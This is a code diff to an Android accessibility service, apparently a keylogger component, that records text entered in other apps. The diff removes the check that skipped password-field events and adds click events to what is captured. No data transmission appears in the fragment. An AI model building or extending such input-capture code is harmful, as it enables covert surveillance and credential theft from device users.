@@ -12,6 +12,7 @@ import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.app.Service
 import android.content.Intent
+import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
@@ -29,12 +30,7 @@ class LoggingAccessibilityService : AccessibilityService() {
         return Service.START_STICKY
     }
 
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event == null || event.isPassword) {
-            // Don't bother with events from password fields; they are empty.
-            return
-        }
-
+    override fun onAccessibilityEvent(event: AccessibilityEvent) {
         when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 // This event type is fired when text is entered in any EditText that is not a
@@ -61,9 +57,12 @@ class LoggingAccessibilityService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         val info = AccessibilityServiceInfo()
-        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP) {
+            info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+        }
         info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED or
-                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
+                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
+                AccessibilityEvent.TYPE_VIEW_CLICKED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         serviceInfo = info
     }
